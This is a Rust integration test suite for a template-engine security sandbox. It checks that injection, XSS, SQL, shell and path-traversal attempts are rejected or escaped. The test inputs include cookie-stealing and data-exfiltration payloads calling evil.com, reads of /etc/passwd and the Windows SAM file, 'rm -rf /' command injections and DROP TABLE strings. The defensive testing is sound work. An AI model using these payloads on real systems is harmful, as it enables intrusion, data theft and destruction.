//! Integration tests for template security hardening
//!
//! These tests verify that the template security system prevents:
//! - Template injection attacks
//! - XSS attacks via HTML injection
//! - SQL injection via template variables
//! - Shell command injection
//! - Path traversal attacks
//! - Denial of service via large templates
//!
//! ## Chicago TDD Pattern
//!
//! All tests follow AAA (Arrange, Act, Assert) pattern with:
//! - Real collaborators (actual Tera engine, real validators)
//! - Observable outputs (rendered templates, error messages)
//! - State verification (security violations detected)

use ggen_core::security::{
    ContextEscaper, SecureTeraEnvironment, TemplateSandbox, TemplateValidator, MAX_TEMPLATE_SIZE,
};
use tera::Context;

// === Security Injection Tests (15+ tests) ===

#[test]
fn test_prevent_file_read_injection() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let context = Context::new();
    let malicious_template = "{{ include_raw('/etc/passwd') }}";

    // Act
    let result = sandbox.render_safe(malicious_template, &context);

    // Assert
    assert!(
        result.is_err(),
        "Should reject template attempting to read files"
    );
}

#[test]
fn test_prevent_file_write_injection() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let context = Context::new();
    let malicious_template = "{{ write_file('/tmp/pwned', 'hacked') }}";

    // Act
    let result = sandbox.render_safe(malicious_template, &context);

    // Assert
    assert!(
        result.is_err(),
        "Should reject template attempting to write files"
    );
}

#[test]
fn test_prevent_network_access_injection() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let context = Context::new();
    let malicious_template = "{{ http('http://evil.com/steal?data=' + secret) }}";

    // Act
    let result = sandbox.render_safe(malicious_template, &context);

    // Assert
    assert!(
        result.is_err(),
        "Should reject template attempting network access"
    );
}

#[test]
fn test_prevent_shell_execution_injection() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let context = Context::new();
    let malicious_template = "{{ exec('rm -rf /') }}";

    // Act
    let result = sandbox.render_safe(malicious_template, &context);

    // Assert
    assert!(
        result.is_err(),
        "Should reject template attempting shell execution"
    );
}

#[test]
fn test_prevent_path_traversal_unix() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let context = Context::new();
    let malicious_template = "{% include '../../../etc/passwd' %}";

    // Act
    let result = sandbox.render_safe(malicious_template, &context);

    // Assert
    assert!(
        result.is_err(),
        "Should reject Unix path traversal in includes"
    );
}

#[test]
fn test_prevent_path_traversal_windows() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let context = Context::new();
    let malicious_template = "{% include '..\\..\\..\\windows\\system32\\config\\sam' %}";

    // Act
    let result = sandbox.render_safe(malicious_template, &context);

    // Assert
    assert!(
        result.is_err(),
        "Should reject Windows path traversal in includes"
    );
}

#[test]
fn test_prevent_xss_via_unescaped_html() {
    // Arrange
    let mut context = Context::new();
    context.insert("user_input", &"<script>alert('xss')</script>");

    // Act - without escaping (vulnerable)
    let unescaped = "<div>{{ user_input }}</div>";

    // Act - with escaping (safe)
    let sandbox = SecureTeraEnvironment::new();
    let safe_template = "<div>{{ user_input | escape_html }}</div>";
    let result = sandbox.render_safe(safe_template, &context);

    // Assert
    assert!(result.is_ok());
    let rendered = result.unwrap();
    assert!(!rendered.contains("<script>"));
    assert!(rendered.contains("&lt;script&gt;"));
}

#[test]
fn test_prevent_sql_injection_via_variables() {
    // Arrange
    let escaper = ContextEscaper;
    let malicious_input = "'; DROP TABLE users; --";

    // Act
    let escaped = ContextEscaper::escape_sql(malicious_input);

    // Assert
    assert!(!escaped.contains("';"));
    assert_eq!(escaped, "'''; DROP TABLE users; --");
}

#[test]
fn test_prevent_command_injection_via_shell_escape() {
    // Arrange
    let malicious_input = "file.txt; rm -rf /";

    // Act
    let escaped = ContextEscaper::escape_shell(malicious_input);

    // Assert
    assert!(!escaped.contains("; rm"));
    assert!(escaped.contains("\\;"));
}

#[test]
fn test_prevent_dos_via_large_template() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let context = Context::new();
    let huge_template = "a".repeat(MAX_TEMPLATE_SIZE + 1);

    // Act
    let result = sandbox.render_safe(&huge_template, &context);

    // Assert
    assert!(
        result.is_err(),
        "Should reject templates exceeding size limit"
    );
}

#[test]
fn test_prevent_variable_name_injection() {
    // Arrange
    let malicious_names = vec![
        "../etc/passwd",
        "user; DROP TABLE users;",
        "var$(whoami)",
        "user[system('rm -rf /')]",
        "../../secrets",
    ];

    // Act & Assert
    for name in malicious_names {
        let result = TemplateValidator::validate_variable_name(name);
        assert!(
            result.is_err(),
            "Should reject malicious variable name: {}",
            name
        );
    }
}

#[test]
fn test_prevent_template_nesting_bomb() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let context = Context::new();

    // Deeply nested template (potential DoS)
    let nested_template = "{% for i in range(0, 10000) %}{{ i }}{% endfor %}";

    // Act
    let result = sandbox.render_safe(nested_template, &context);

    // Assert - should complete without hanging
    // Note: This tests that rendering doesn't hang indefinitely
    assert!(result.is_ok() || result.is_err());
}

#[test]
fn test_prevent_regex_dos() {
    // Arrange
    let validator = TemplateValidator;

    // Regex DoS attempt (catastrophic backtracking)
    let malicious_input = "a".repeat(1000) + "!";

    // Act
    let result = TemplateValidator::validate_variable_name(&malicious_input);

    // Assert - should reject or complete quickly
    assert!(
        result.is_err(),
        "Should reject excessively long variable names"
    );
}

#[test]
fn test_prevent_format_string_injection() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let mut context = Context::new();
    context.insert("format", &"%x %x %x %x");

    // Act - ensure format strings don't expose memory
    let template = "{{ format }}";
    let result = sandbox.render_safe(template, &context);

    // Assert
    assert!(result.is_ok());
    let rendered = result.unwrap();
    assert_eq!(rendered, "%x %x %x %x"); // Should render as-is, not interpret
}

#[test]
fn test_prevent_unicode_bypass() {
    // Arrange
    let validator = TemplateValidator;

    // Unicode homoglyphs that look like valid chars but aren't
    let unicode_attack = "user\u{200B}name"; // Zero-width space

    // Act
    let result = TemplateValidator::validate_variable_name(unicode_attack);

    // Assert
    assert!(
        result.is_err(),
        "Should reject variable names with unicode tricks"
    );
}

// === Integration Tests with Real Templates (10+ tests) ===

#[test]
fn test_integration_safe_user_profile_template() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let mut context = Context::new();
    context.insert("username", &"alice");
    context.insert("bio", &"Software engineer");

    let template = r#"
<div class="profile">
    <h1>{{ username | escape_html }}</h1>
    <p>{{ bio | escape_html }}</p>
</div>
"#;

    // Act
    let result = sandbox.render_safe(template, &context);

    // Assert
    assert!(result.is_ok());
    let rendered = result.unwrap();
    assert!(rendered.contains("alice"));
    assert!(rendered.contains("Software engineer"));
}

#[test]
fn test_integration_safe_sql_query_template() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let mut context = Context::new();
    context.insert("table_name", &"users");
    context.insert("user_input", &"alice");

    let template = r#"
SELECT * FROM {{ table_name }}
WHERE username = '{{ user_input | escape_sql }}'
"#;

    // Act
    let result = sandbox.render_safe(template, &context);

    // Assert
    assert!(result.is_ok());
    let rendered = result.unwrap();
    assert!(rendered.contains("users"));
    assert!(rendered.contains("alice"));
}

#[test]
fn test_integration_safe_shell_command_template() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let mut context = Context::new();
    context.insert("filename", &"report.pdf");

    let template = r#"
#!/bin/bash
file="{{ filename | escape_shell }}"
echo "Processing: $file"
"#;

    // Act
    let result = sandbox.render_safe(template, &context);

    // Assert
    assert!(result.is_ok());
    let rendered = result.unwrap();
    assert!(rendered.contains("report.pdf"));
}

#[test]
fn test_integration_malicious_xss_attack() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let mut context = Context::new();
    context.insert(
        "comment",
        &"<script>fetch('http://evil.com?cookie='+document.cookie)</script>",
    );

    let template = r#"
<div class="comment">
    {{ comment | escape_html }}
</div>
"#;

    // Act
    let result = sandbox.render_safe(template, &context);

    // Assert
    assert!(result.is_ok());
    let rendered = result.unwrap();
    assert!(!rendered.contains("<script>"));
    assert!(rendered.contains("&lt;script&gt;"));
}

#[test]
fn test_integration_malicious_sql_injection() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let mut context = Context::new();
    context.insert("username", &"admin'; DROP TABLE users; --");

    let template = r#"
SELECT * FROM users WHERE username = '{{ username | escape_sql }}'
"#;

    // Act
    let result = sandbox.render_safe(template, &context);

    // Assert
    assert!(result.is_ok());
    let rendered = result.unwrap();
    assert!(!rendered.contains("'; DROP"));
    assert!(rendered.contains("''; DROP"));
}

#[test]
fn test_integration_malicious_command_injection() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let mut context = Context::new();
    context.insert("filename", &"file.txt; rm -rf /");

    let template = r#"
#!/bin/bash
cat {{ filename | escape_shell }}
"#;

    // Act
    let result = sandbox.render_safe(template, &context);

    // Assert
    assert!(result.is_ok());
    let rendered = result.unwrap();
    assert!(!rendered.contains("; rm"));
    assert!(rendered.contains("\\;"));
}

#[test]
fn test_integration_complex_nested_escaping() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let mut context = Context::new();
    context.insert("user_html", &"<b>Bold</b>");
    context.insert("user_sql", &"O'Reilly");
    context.insert("user_shell", &"$HOME");

    let template = r#"
HTML: {{ user_html | escape_html }}
SQL: {{ user_sql | escape_sql }}
Shell: {{ user_shell | escape_shell }}
"#;

    // Act
    let result = sandbox.render_safe(template, &context);

    // Assert
    assert!(result.is_ok());
    let rendered = result.unwrap();
    assert!(rendered.contains("&lt;b&gt;Bold&lt;/b&gt;"));
    assert!(rendered.contains("O''Reilly"));
    assert!(rendered.contains("\\$HOME"));
}

#[test]
fn test_integration_whitelist_enforcement() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();

    // Act & Assert - allowed functions
    assert!(sandbox.is_function_allowed("upper"));
    assert!(sandbox.is_function_allowed("lower"));
    assert!(sandbox.is_function_allowed("length"));
    assert!(sandbox.is_function_allowed("escape_html"));

    // Act & Assert - forbidden functions
    assert!(!sandbox.is_function_allowed("include_raw"));
    assert!(!sandbox.is_function_allowed("read_file"));
    assert!(!sandbox.is_function_allowed("exec"));
}

#[test]
fn test_integration_size_limit_boundary() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let context = Context::new();

    // Just under limit
    let large_template = "a".repeat(MAX_TEMPLATE_SIZE - 100);
    let result1 = sandbox.render_safe(&large_template, &context);
    assert!(result1.is_ok(), "Should accept template just under limit");

    // Just over limit
    let too_large = "a".repeat(MAX_TEMPLATE_SIZE + 1);
    let result2 = sandbox.render_safe(&too_large, &context);
    assert!(result2.is_err(), "Should reject template over limit");
}

#[test]
fn test_integration_custom_size_limit() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new().with_max_size(1000);
    let context = Context::new();

    // Within custom limit
    let small = "a".repeat(500);
    assert!(sandbox.render_safe(&small, &context).is_ok());

    // Exceeds custom limit
    let large = "a".repeat(1500);
    assert!(sandbox.render_safe(&large, &context).is_err());
}

// === Edge Case Tests ===

#[test]
fn test_edge_case_empty_template() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let context = Context::new();

    // Act
    let result = sandbox.render_safe("", &context);

    // Assert
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "");
}

#[test]
fn test_edge_case_empty_context() {
    // Arrange
    let sandbox = SecureTeraEnvironment::new();
    let context = Context::new();

    // Act
    let result = sandbox.render_safe("Hello World!", &context);

    // Assert
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "Hello World!");
}

#[test]
fn test_edge_case_all_special_chars() {
    // Arrange
    let all_special = "<>&\"'/;|$`(){}[]!@#%^*?~";
    let html_escaped = ContextEscaper::escape_html(all_special);
    let sql_escaped = ContextEscaper::escape_sql(all_special);
    let shell_escaped = ContextEscaper::escape_shell(all_special);

    // Assert
    assert!(!html_escaped.contains('<'));
    assert!(!html_escaped.contains('>'));
    assert!(!sql_escaped.contains("';"));
    assert!(shell_escaped.contains('\\'));
}

#[test]
fn test_variable_validation_unicode_letters() {
    // Arrange - Unicode letters should be allowed
    let unicode_names = vec!["café", "naïve", "日本語"];

    // Act & Assert
    for name in unicode_names {
        let result = TemplateValidator::validate_variable_name(name);
        // Unicode letters are considered alphanumeric by Rust's char::is_alphanumeric
        assert!(
            result.is_ok(),
            "Should allow Unicode letters in variable names: {}",
            name
        );
    }
}

#[test]
fn test_variable_validation_boundary_length() {
    // Arrange
    use ggen_core::security::MAX_VARIABLE_NAME_LENGTH;

    // Just under limit
    let valid_length = "a".repeat(MAX_VARIABLE_NAME_LENGTH);
    assert!(TemplateValidator::validate_variable_name(&valid_length).is_ok());

    // Just over limit
    let invalid_length = "a".repeat(MAX_VARIABLE_NAME_LENGTH + 1);
    assert!(TemplateValidator::validate_variable_name(&invalid_length).is_err());
}
